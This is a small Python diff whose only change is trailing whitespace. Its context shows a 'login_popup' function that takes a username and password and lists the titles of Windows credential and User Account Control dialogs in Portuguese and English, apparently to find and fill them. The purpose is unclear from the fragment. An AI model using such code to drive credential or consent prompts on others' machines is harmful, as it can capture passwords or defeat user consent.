@@ -26,7 +26,7 @@ def is_file(path: str) -> bool:
 def login_popup(username: str, password: str):
     if not username or not password:
         return
-    titles = [
+    titles = [  
         "Segurança do Windows", "Windows Security", "Credenciais de Rede",
         "Network Credentials", "Controle de Conta de Usuário", "User Account Control",
     ]
